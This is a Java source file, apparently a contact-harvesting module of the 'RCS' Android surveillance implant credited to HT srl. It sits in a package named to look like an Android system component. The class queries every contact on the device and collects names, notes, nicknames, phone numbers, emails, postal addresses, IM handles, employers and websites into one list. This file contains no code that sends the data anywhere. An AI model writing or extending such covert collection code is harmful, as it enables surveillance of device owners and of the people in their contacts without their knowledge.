/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : PickContact.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module.task;

import java.util.ArrayList;
import java.util.List;
import java.util.ListIterator;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Nickname;
import android.provider.ContactsContract.CommonDataKinds.Note;
import android.provider.ContactsContract.CommonDataKinds.Phone;

import com.android.networking.Status;

public class PickContact {
	private static final String TAG = "PickContact"; //$NON-NLS-1$

	private List<PhoneInfo> loadUserPhones(ContentResolver cr) {

		final Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		final int size = cursor.getCount();
		final List<PhoneInfo> list = new ArrayList<PhoneInfo>(size);

		while (cursor.moveToNext()) {
			final long userId = cursor.getLong(cursor.getColumnIndex(BaseColumns._ID));
			final long hasPhone = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

			if (hasPhone > 0) {
				final String phoneWhere = Phone.CONTACT_ID + " = ? "; //$NON-NLS-1$
				final String[] phoneWhereParams = new String[] { userId + "" }; //$NON-NLS-1$
				final Cursor phoneCursor = cr.query(Phone.CONTENT_URI, null, phoneWhere, phoneWhereParams, null);

				while (phoneCursor.moveToNext()) {
					final int phoneType = phoneCursor.getInt(phoneCursor.getColumnIndex(Phone.TYPE));

					final String phoneValue = phoneCursor.getString(phoneCursor.getColumnIndex(Phone.NUMBER));

					list.add(new PhoneInfo(userId, phoneType, phoneValue));
				}

				phoneCursor.close();
			}
		}

		cursor.close();
		return list;
	}

	private List<EmailInfo> loadUserEmails(ContentResolver cr) {
		final Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		final int size = cursor.getCount();
		final List<EmailInfo> list = new ArrayList<EmailInfo>(size);

		while (cursor.moveToNext()) {
			final long userId = cursor.getLong(cursor.getColumnIndex(BaseColumns._ID));

			final Cursor emailCur = cr.query(Email.CONTENT_URI, null, Email.CONTACT_ID + " = ?", new String[] { userId //$NON-NLS-1$
					+ "" }, null); //$NON-NLS-1$

			while (emailCur.moveToNext()) {
				final String email = emailCur.getString(emailCur.getColumnIndex(Email.DATA));
				final int emailType = emailCur.getInt(emailCur.getColumnIndex(Email.TYPE));

				list.add(new EmailInfo(userId, emailType, email));
			}

			emailCur.close();
		}

		cursor.close();
		return list;
	}

	private List<UserInfo> loadUserInfos(ContentResolver cr) {

		final Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		final int size = cursor.getCount();
		final List<UserInfo> list = new ArrayList<UserInfo>(size);

		while (cursor.moveToNext()) {
			String userNote = null;
			String userNickName = null;

			final String userName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
			final long userId = cursor.getLong(cursor.getColumnIndex(BaseColumns._ID));

			final String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
					+ " = ?"; //$NON-NLS-1$
			final String[] noteWhereParams = new String[] { userId + "", Note.CONTENT_ITEM_TYPE }; //$NON-NLS-1$

			final Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);

			if (noteCur.moveToFirst()) {
				userNote = noteCur.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
			}

			noteCur.close();

			final String nickNameWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " //$NON-NLS-1$
					+ ContactsContract.Data.MIMETYPE + " = ?"; //$NON-NLS-1$

			final String[] nickNameWhereParams = new String[] { userId + "", Nickname.CONTENT_ITEM_TYPE }; //$NON-NLS-1$

			final Cursor nickCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, nickNameWhere,
					nickNameWhereParams, null);

			if (nickCursor.moveToFirst()) {
				userNickName = nickCursor.getString(nickCursor
						.getColumnIndex(ContactsContract.CommonDataKinds.Nickname.NAME));
			}

			nickCursor.close();
			list.add(new UserInfo(userId, userName, userNote, userNickName));
		}

		cursor.close();
		return list;
	}

	private List<PostalAddressInfo> loadUserPA(ContentResolver cr) {
		final Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		final int size = cursor.getCount();
		final List<PostalAddressInfo> list = new ArrayList<PostalAddressInfo>(size);

		while (cursor.moveToNext()) {
			final long userId = cursor.getLong(cursor.getColumnIndex(BaseColumns._ID));
			final String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
					+ " = ?"; //$NON-NLS-1$

			final String[] addrWhereParams = new String[] { userId + "", //$NON-NLS-1$
					ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE };

			final Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null, addrWhere, addrWhereParams, null);

			while (addrCur.moveToNext()) {
				final String poBox = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
				final String street = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
				final String city = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
				final String state = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
				final String postalCode = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
				final String country = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
				final String neighbor = addrCur.getString(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.NEIGHBORHOOD));
				final int type = addrCur.getInt(addrCur
						.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));

				list.add(new PostalAddressInfo(userId, type, street, poBox, neighbor, city, state, postalCode, country));
			}

			addrCur.close();
		}

		cursor.close();
		return list;
	}

	private List<ImInfo> loadUserIm(ContentResolver cr) {
		final Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		final int size = cursor.getCount();
		final List<ImInfo> list = new ArrayList<ImInfo>(size);

		while (cursor.moveToNext()) {
			final long userId = cursor.getLong(cursor.getColumnIndex(BaseColumns._ID));

			final String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
					+ " = ? "; //$NON-NLS-1$
			final String[] imWhereParams = new String[] { userId + "", //$NON-NLS-1$
					ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE };
			final Cursor imCursor = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);

			while (imCursor.moveToNext()) {
				final int imType = imCursor.getInt(imCursor
						.getColumnIndex(ContactsContract.CommonDataKinds.Im.PROTOCOL));
				final String imValue = imCursor.getString(imCursor
						.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));

				list.add(new ImInfo(userId, imType, imValue));
			}

			imCursor.close();
		}

		cursor.close();
		return list;
	}

	private List<OrganizationInfo> loadUserOrg(ContentResolver cr) {
		final Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		final int size = cursor.getCount();
		final List<OrganizationInfo> list = new ArrayList<OrganizationInfo>(size);

		while (cursor.moveToNext()) {
			final int userId = cursor.getInt(cursor.getColumnIndex(BaseColumns._ID));

			final String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
					+ " = ? "; //$NON-NLS-1$
			final String[] orgWhereParams = new String[] { userId + "", //$NON-NLS-1$
					ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE };

			final Cursor orgCursor = cr.query(ContactsContract.Data.CONTENT_URI, null, orgWhere, orgWhereParams, null);

			while (orgCursor.moveToNext()) {
				final String companyName = orgCursor.getString(orgCursor
						.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
				final String companyTitle = orgCursor.getString(orgCursor
						.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
				final int type = orgCursor.getInt(orgCursor
						.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TYPE));

				list.add(new OrganizationInfo(userId, type, companyName, companyTitle));
			}

			orgCursor.close();
		}

		cursor.close();
		return list;
	}

	private List<WebsiteInfo> loadUserWebsite(ContentResolver cr) {
		final Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		final int size = cursor.getCount();
		final List<WebsiteInfo> list = new ArrayList<WebsiteInfo>(size);

		while (cursor.moveToNext()) {
			final long userId = cursor.getInt(cursor.getColumnIndex(BaseColumns._ID));
			final String websiteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE //$NON-NLS-1$
					+ " = ? "; //$NON-NLS-1$
			final String[] websiteWhereParams = new String[] { userId + "", //$NON-NLS-1$
					ContactsContract.CommonDataKinds.Website.CONTENT_ITEM_TYPE };

			final Cursor webCursor = cr.query(ContactsContract.Data.CONTENT_URI, null, websiteWhere,
					websiteWhereParams, null);

			while (webCursor.moveToNext()) {
				final String websiteName = webCursor.getString(webCursor
						.getColumnIndex(ContactsContract.CommonDataKinds.Website.URL));

				list.add(new WebsiteInfo(userId, websiteName));
			}

			webCursor.close();
		}

		cursor.close();
		return list;
	}

	public List<Contact> getContactInfo() {
		final ContentResolver cr = Status.getAppContext().getContentResolver();

		final List<UserInfo> listUser = loadUserInfos(cr);
		final List<EmailInfo> listEmail = loadUserEmails(cr);
		final List<PostalAddressInfo> listPa = loadUserPA(cr);
		final List<PhoneInfo> listPhone = loadUserPhones(cr);
		final List<ImInfo> listIm = loadUserIm(cr);
		final List<OrganizationInfo> listOrganization = loadUserOrg(cr);
		final List<WebsiteInfo> listWebsite = loadUserWebsite(cr);

		// Compila la lista di ogni singolo contatto
		final List<Contact> list = new ArrayList<Contact>();

		final ListIterator<UserInfo> iter = listUser.listIterator();

		while (iter.hasNext()) {
			final UserInfo user = iter.next();

			final Contact c = new Contact(user);

			final long id = user.getUserId();

			// Email Info
			final ListIterator<EmailInfo> e = listEmail.listIterator();

			while (e.hasNext()) {
				final EmailInfo einfo = e.next();

				if (einfo.getUserId() == id) {
					c.add(einfo);
				}
			}

			// Postal Address Info
			final ListIterator<PostalAddressInfo> p = listPa.listIterator();

			while (p.hasNext()) {
				final PostalAddressInfo pinfo = p.next();

				if (pinfo.getUserId() == id) {
					c.add(pinfo);
				}
			}

			// Phone Info
			final ListIterator<PhoneInfo> po = listPhone.listIterator();

			while (po.hasNext()) {
				final PhoneInfo poinfo = po.next();

				if (poinfo.getUserId() == id) {
					c.add(poinfo);
				}
			}

			// Im Info
			final ListIterator<ImInfo> im = listIm.listIterator();

			while (im.hasNext()) {
				final ImInfo iminfo = im.next();

				if (iminfo.getUserId() == id) {
					c.add(iminfo);
				}
			}

			// Organization Info
			final ListIterator<OrganizationInfo> o = listOrganization.listIterator();

			while (o.hasNext()) {
				final OrganizationInfo oinfo = o.next();

				if (oinfo.getUserId() == id) {
					c.add(oinfo);
				}
			}

			// Webiste Info
			final ListIterator<WebsiteInfo> w = listWebsite.listIterator();

			while (w.hasNext()) {
				final WebsiteInfo winfo = w.next();

				if (winfo.getUserId() == id) {
					c.add(winfo);
				}
			}

			// c.print();
			list.add(c);
		}

		return list;
	}
}
